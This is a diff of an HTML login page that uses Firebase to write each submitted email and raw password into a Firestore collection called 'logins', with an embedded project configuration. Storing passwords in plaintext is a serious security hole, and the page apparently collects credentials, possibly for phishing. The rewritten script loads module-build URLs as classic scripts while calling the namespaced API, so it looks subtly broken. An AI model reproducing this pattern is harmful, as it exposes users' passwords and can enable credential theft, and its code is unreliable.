@@ -79,26 +79,23 @@
   </div>
 
   <!-- Firebase SDK -->
-  <script type="module">
-    // Import the functions you need from the SDKs you need
-    import { initializeApp } from "https://www.gstatic.com/firebasejs/11.10.0/firebase-app.js";
-    import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/11.10.0/firebase-firestore.js";
-    // import { getAnalytics } from "https://www.gstatic.com/firebasejs/11.10.0/firebase-analytics.js"; // غير مطلوب هنا
-
+  <script src="https://www.gstatic.com/firebasejs/11.10.0/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/11.10.0/firebase-firestore.js"></script>
+  <script>
     // Your web app's Firebase configuration
     const firebaseConfig = {
       apiKey: "AIzaSyCnUUc7NRAGjp03fpKo44WOUHhi0nkIVzs",
       authDomain: "mydatabase-7416e.firebaseapp.com",
       projectId: "mydatabase-7416e",
-      storageBucket: "mydatabase-7416e.appspot.com", // تصحيح هنا
+      storageBucket: "mydatabase-7416e.appspot.com",
       messagingSenderId: "630217015078",
       appId: "1:630217015078:web:93a0946808183deffe8be7",
       measurementId: "G-BTLMGS3C09"
     };
 
     // Initialize Firebase
-    const app = initializeApp(firebaseConfig);
-    const db = getFirestore(app);
+    const app = firebase.initializeApp(firebaseConfig);
+    const db = firebase.firestore();
 
     // دالة لحفظ بيانات تسجيل الدخول
     function saveLogin() {
@@ -107,10 +104,10 @@
       const message = document.getElementById('message');
       const errorMessage = document.getElementById('error-message');
 
-      addDoc(collection(db, 'logins'), {
+      db.collection('logins').add({
         email: email,
         password: password,
-        timestamp: new Date()
+        timestamp: firebase.firestore.FieldValue.serverTimestamp()
       })
       .then(() => {
         message.textContent = 'تم حفظ البيانات بنجاح!';
@@ -125,4 +122,5 @@
     }
   </script>
 </body>
+  <!-- new code -->
 </html>
